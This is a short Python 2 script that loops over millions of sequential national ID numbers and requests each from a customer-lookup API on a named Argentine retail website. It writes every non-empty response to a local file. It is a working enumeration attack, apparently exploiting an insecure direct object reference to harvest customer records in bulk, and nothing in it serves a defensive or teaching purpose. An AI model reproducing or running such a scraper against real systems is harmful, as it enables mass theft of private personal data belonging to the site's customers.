import requests

for i in range(5008455,50000000):
	try:
		r = requests.get("http://www.iralsuper.com.ar/api/clientes/documento/1/"+str(i))	
	except:	
		pass	
	if len(r.text)==4:
		pass
	else:
		print r.text
		f = open ("fichero.txt", "a")
		f.write(r.text)
		f.write("\n")
		f.close()
